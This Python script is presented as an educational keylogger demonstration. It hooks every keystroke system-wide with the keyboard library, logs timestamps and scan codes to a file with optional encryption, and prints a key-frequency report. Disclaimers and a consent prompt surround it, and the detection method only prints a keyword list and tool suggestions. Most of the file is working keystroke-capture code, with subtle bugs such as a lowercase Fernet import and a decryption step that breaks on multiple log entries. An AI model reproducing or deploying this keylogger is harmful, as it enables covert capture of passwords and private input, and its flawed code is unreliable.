#!/usr/bin/env python3
"""
KEYLOGGER
Purpose: Understand keystroke logging techniques for defense
Legal: Only use on systems you own or have explicit permissione 
Defense use: Build keylogger detectors, undersand attack vectors
"""

import keyboard
import threading
import time
from datetime import datetime
import hashlib
import json
from cryptography.fernet import fernet

class KeyloggerMonitor:
    """
    Demonstrates keylogging mechanics
    """

    def __init__(self, log_file="keystrokes.log", encrypt_logs=False):
        """
        Initialize monitoring systems
        log_file: Output file for captured keystrokes
        encrypt_logs: Encrypt log file with AES
        """
        self.log_file = log_file
        self.encrypt_logs = encrypt_logs
        self.is_running = False
        self.keystroke_buffer = []

        #Encryption setup
        if encrypt_logs:
            self.encryption_key = Fernet.generate_key()
            self.cipher = Fernet(self.encryption_key)
            print(f"[*] Encryption key: {self.encryption_key.decode()}")

        #session metadata
        self.session_info = {
            "start_time": datetime.now().isoformat(),
            "system": "Educational demo",
            "purpose": "security training"
        }

        print("[*] KEYLOGGER DEMO ")
        print("[*] Pre4ss ESC to stop recording\n")

    def _on_key_event(self, event):
        """
        callback for keyboard events
        captures: key press, timing and metadata
        """
        if not self.is_running:
            return
        
        timestamp = datetime.now().isoformat()

        keystroke_data = {
            "timestamp": timestamp,
            "key": event.name,
            "event_type": event.event_type,
            "scan_code": event.scan_code
        }

        self.keystroke_buffer.append(keystroke_data)

        #Buffer management(write every 10 keystrokes)
        if len(self.keystroke_buffer) >=10:
            self._write_buffer_to_file()

    def _write_buffer_to_file(self):
        #Write buffered keystrokes to log file
        if not self.keystroke_buffer:
            return

        log_entry = {
            "session": self.session_info,
            "keystrokes": self.keystroke_buffer.copy()
        }

        log_data = json.dumps(log_entry) + "\n"

        try:
            if self.encrypt_logs:
                #Encrypt before writing
                encrypted_data = self.cipher.encrypt(log_data.encode())
                write_data =  encrypted_data
            else:
                write_data = log_data.encode()

            
            with open(self.log_file, 'ab') as f:
                f.write(write_data)

            self.keystroke_buffer.clear()

        except Exception as e:
            print(f"[!] Error writing logs: {e}")

    def start_monitoring(self, duration=None):
        """
        Start keystroke monitoring
        duration: Optimal monitoring duration in seconds
        """
        self.is_running = True

        #setup keyboard hook 
        keyboard.hook(self._on_key_event)

        print("[*] Monitoring started...")

        if duration:
            #auto-stop after specified duration
            timer = threading.Timer(duration, self.stop_monitoring)
            timer.start()

        #wait for ESC key to stop
        keyboard.wait('esc')
        self.stop_monitoring()

    def stop_monitoring(self):
        #stop monitoring and clean up
        self.is_running = False

        #Write any remaining buffer
        if self.keystroke_buffer:
            self._write_buffer_to_file()

        #unhook keyboard listener
        keyboard.unhook_all()

        #generate report
        self._generate_report()

        print("\n[*] Monitoring stopped")
        print(f"[*] Logs saved to: {self.log_file}")

    def _generate_report(self):
        #Generate analysis report of captured keystrokes
        try:
            with open(self.log_file, 'rb') as f:
                if self.encrypt_logs:
                    data = self.cipher.decrypt(f.read()).decode()
                else:
                    data = f.read().decode()

            #parse and analyze
            keystrokes = []
            for line in data.strip().split('\n'):
                entry = json.loads(line)
                keystrokes.extend(entry['keystrokes'])

            print("\n" + "="*50)
            print("KEYSTROKE ANALYSIS REPORT")
            print("="*50)
            print(f"Total keystrokes: {len(keystrokes)}")
            print(f"Session duration: {self.session_info['start_time']} to {datetime.now().isoformat()}")

            #comon pattern detection
            common_keys = {}
            for stroke in keystrokes:
                key = stroke['key']
                common_keys[key] = common_keys.get(key, 0) + 1

            print("\nMost frequent keys")
            for key, count in sorted(common_keys.items(), key=lambda x: x[1], reverse=True)[:10]:
                print(f" {key}: {count} times")

        except Exception as e:
            print(f"[!] Could not generate report; {e}")

    def detect_keyloggers(self):
        #Detect potential keyloggers--demonstrates how to find suspicious keyboard hooks
        print("\n" + "="*50)
        print("KEYLOGGER DETECTION SCAN")
        print("="*50)

        #check for suspicious processes 
        suspicious_features = [
            "keylog", "logger", "hook", "inject", "stealer", "spy", "monitor"
        ]

        print("[*] This is a simplified demonstration")
        print("[*] Real detection reuires kernel-level monitoring")
        print("[*] Consider using: Sysinternals Process Explorer")
        print("[*] Or: Windows Defender Advanced Threat protection")

if __name__ == "__main__":
    print("="*60)
    print("KEYLOGGER DEMONSTRATION")
    print("="*60)
    print("Purpose: Understand attack vectors for defemsive security")
    print("Legal Use: Only on systems you own with permission")
    print("Unauthorized use is illegal and unethical")
    print("="*60)

    consent = input("Do you understand and agree to ethical use? (yes/no): ")

    if consent.lower() != 'yes':
        print("[!] Exiting. Only proceed with proper authorization.")
        exit()

    #Initialize and run (30 second demo)
    monitor = KeyloggerMonitor(
        log_file="demo.log",
        encrypt_logs=True
            )
    
    #Run for 30 seconds maximum
    try:
        monitor.start_monitoring(duration=30)
    except KeyboardInterrupt:
        monitor.stop_monitoring()

    #show defensive detection
    monitor.detect_keyloggers()